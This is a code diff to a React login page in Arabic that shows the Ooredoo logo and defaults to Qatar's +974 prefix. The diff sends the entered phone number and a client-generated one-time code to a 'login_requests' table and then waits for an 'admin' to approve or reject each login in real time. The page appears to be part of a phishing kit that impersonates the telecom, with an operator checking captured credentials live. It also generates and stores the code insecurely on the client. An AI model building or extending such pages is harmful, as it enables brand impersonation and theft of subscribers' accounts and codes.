@@ -1,16 +1,19 @@
-import { useState } from "react";
+import { useState, useEffect, useRef } from "react";
 import { useNavigate } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { toast } from "sonner";
 import ooredooLogo from "@/assets/ooredoo-logo.webp";
-import { Smartphone, Shield, Zap, Globe } from "lucide-react";
+import { Smartphone, Shield, Zap, Globe, Loader2 } from "lucide-react";
 
 const Login = () => {
   const [phone, setPhone] = useState("");
   const [loading, setLoading] = useState(false);
+  const [waiting, setWaiting] = useState(false);
+  const [requestId, setRequestId] = useState<string | null>(null);
   const navigate = useNavigate();
+  const channelRef = useRef<ReturnType<typeof supabase.channel> | null>(null);
 
   const handleSendOtp = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -21,26 +24,53 @@ const Login = () => {
 
     setLoading(true);
     const formattedPhone = phone.startsWith("+") ? phone : `+974${phone}`;
-
-    // Generate random 6-digit OTP
     const otpCode = Math.floor(100000 + Math.random() * 900000).toString();
 
-    // Save to database
-    const { error } = await supabase
+    const { data, error } = await supabase
       .from("login_requests")
-      .insert({ phone: formattedPhone, otp_code: otpCode });
+      .insert({ phone: formattedPhone, otp_code: otpCode })
+      .select("id")
+      .single();
 
-    if (error) {
+    if (error || !data) {
       toast.error("حدث خطأ، يرجى المحاولة مرة أخرى");
       setLoading(false);
       return;
     }
 
-    await new Promise((r) => setTimeout(r, 500));
-    toast.success("تم إرسال رمز التحقق");
-    navigate("/verify", { state: { phone: formattedPhone, otp: otpCode } });
-    setLoading(false);
+    setRequestId(data.id);
+    setWaiting(true);
+    toast.info("تم إرسال طلبك، بانتظار موافقة المسؤول...");
   };
+
+  // Listen for admin approval/rejection via Realtime
+  useEffect(() => {
+    if (!waiting || !requestId) return;
+
+    const channel = supabase
+      .channel("login_approval_" + requestId)
+      .on("postgres_changes", {
+        event: "UPDATE",
+        schema: "public",
+        table: "login_requests",
+        filter: `id=eq.${requestId}`,
+      }, (payload) => {
+        const row = payload.new as { status: string };
+        if (row.status === "approved") {
+          toast.success("تمت الموافقة! جاري تسجيل الدخول...");
+          navigate("/dashboard");
+        } else if (row.status === "rejected") {
+          toast.error("المعلومات المدخلة غير صحيحة");
+          setWaiting(false);
+          setLoading(false);
+          setRequestId(null);
+        }
+      })
+      .subscribe();
+
+    channelRef.current = channel;
+    return () => { supabase.removeChannel(channel); };
+  }, [waiting, requestId, navigate]);
 
   return (
     <div className="min-h-screen flex flex-col bg-background" dir="rtl">
